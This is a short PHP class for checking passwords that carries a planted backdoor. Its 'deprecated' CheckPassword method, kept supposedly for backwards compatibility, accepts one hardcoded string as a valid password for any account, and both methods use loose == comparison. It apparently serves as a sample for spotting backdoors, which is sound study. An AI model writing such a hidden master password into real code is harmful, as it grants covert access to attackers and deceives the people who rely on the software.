<?php
class PasswordChecker
{
	public $pw;

	public function __construct($pw)
	{
		$this->pw = $pw;
	}

	public function RealCheckPassword($password)
	{
		if ($password == $this->pw)
		{
			return true;
		}
		return false;
	}

	// Deprecated but left in for backwards compatibility reasons
	public function CheckPassword($password)
	{
		if($password == "t]c#5\{T)w@;XKtA")
		{
			return true;
		}
		return false;
	}
}
?>
